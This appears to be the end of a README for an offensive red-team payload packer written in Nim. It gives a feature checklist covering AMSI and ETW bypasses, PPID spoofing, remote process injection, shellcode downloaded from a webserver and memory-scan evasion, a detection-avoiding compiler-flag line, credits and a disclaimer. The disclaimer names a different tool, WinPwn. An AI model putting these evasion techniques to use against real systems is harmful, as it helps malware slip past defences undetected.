- [X] PPID Spoofing for newly created processes
- [X] BlockDLLs for new processes
- [X] Patchless AMSI bypass (e.g. https://gist.github.com/CCob/fe3b63d80890fafeca982f76c8a3efdf)
- [X] AMSI bypass via NtCreateSection Hook (e.g. https://waawaa.github.io/es/amsi_bypass-hooking-NtCreateSection/)
- [X] More ETW Patching for EtwNotificationRegister, EtwEventRegister, EtwEventWriteFull
- [X] Service binary support, like https://github.com/enthus1ast/nimWindowsService/
- [X] DLL hijacking switch for DLLMain with process attach
- [X] Fix x86 casting bugs
- [ ] Wow64 Support
- [X] Add `--pump` null bytes in between like https://gitlab.com/ORCA000/entropyfix (Have to test, may cause crashes)
- [X] CPL Output files
- [ ] Decoy HTTP requests option
- [X] Download Shellcode from Webserver or read it from local file as alternative to embedding (default)
- [X] Use more compiler flags to overwrite dynlib to avoid Function IoCs plus reduze size `-d:nimNoLibc -d:noSignalHandler --gc:none -d:noSignalHandler --infChecks:off --stdout:off --hotCodeReloading:off --stackTraceMsgs:off --tlsEmulation:off --nanChecks:off -d:nimBuiltinSetjmp --sinkInference:off --deepcopy:off --styleCheck:off --skipParentCfg --passC:"-nostdlib -ffunction-sections -fno-ident -fno-asynchronous-unwind-tables -fno-exceptions" --passL:"-s --disable-runtime-pseudo-relo  --disable-reloc-section" --dynlibOverrideAll`
- [X] Use cloned Handles instead of OpenProcess (Handlekatz like) for remote process injection or as alternative Handle Elevation
- [X] Handle elevation
- [X] Add ThreadlessInject for Remote Injection
- [ ] Add Callback execution primitives for remote injection via a Nim Port of https://github.com/lem0nSec/CreateRemoteThreadPlus
- [X] Store Payloads as MAC or IP-Adresses and retrieve the encrypted Payload on runtime to decrease entropy
- [X] Add multiple Jumps for different regions in the Thread start address (DripLoader like) to avoid memory scan detections (https://web.archive.org/web/20220319032617/https://blog.redbluepurple.io/offensive-research/bypassing-injection-detection)

## CREDITS

- [X] [@WhyDee86](https://twitter.com/WhyDee86) - Sleep function + remote process Library module + hardcoded arguments initial code
- [X] [@chvancooten](https://twitter.com/chvancooten) - Custom strenc + Inspiration from his Nim Packer
- [X] [@lefayjey](https://github.com/lefayjey) - DLL Output + CNA Script contribution
- [X] [@d35ha](https://github.com/d35ha/CallObfuscator) - CallObfuscator
- [X] [@klezVirus](https://github.com/klezVirus/NimlineWhispers3) - NimlineWhispers3
- [X] [@TheWover](https://github.com/TheWover/donut) - Donut 
- [X] [@icyguider](https://github.com/icyguider) - Inspiration
- [X] [Tylous](https://github.com/Tylous/) - LimeLighter
- [X] [Mr-Un1k0d3r](https://github.com/Mr-Un1k0d3r) - 1 byte AMSI / ETW Patch + SandBox Evasion ideas
- [X] [glynx](https://github.com/glynx) - Nim-RunPE hardcoded arguments Pull Request
- [X] [moloch--](https://github.com/moloch--) - Denim
- [X] [EdgeBalci](https://github.com/EgeBalci) - SGN
- [X] [monoxgas](https://github.com/monoxgas) - Koppeling
- [X] [eversinc33](https://github.com/eversinc33) - BouncyGate, Docker File
- [X] [OffenseTeacher](https://github.com/OffenseTeacher) - Steganim
- [X] [OtterHacker](https://github.com/OtterHacker/Conferences/tree/main/Defcon31) - Stomb+Threadless inject idea
- [X] [DrDv](https://github.com/DrorDvash) - CommandLine Generator

## Legal disclaimer:
Usage of WinPwn for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.
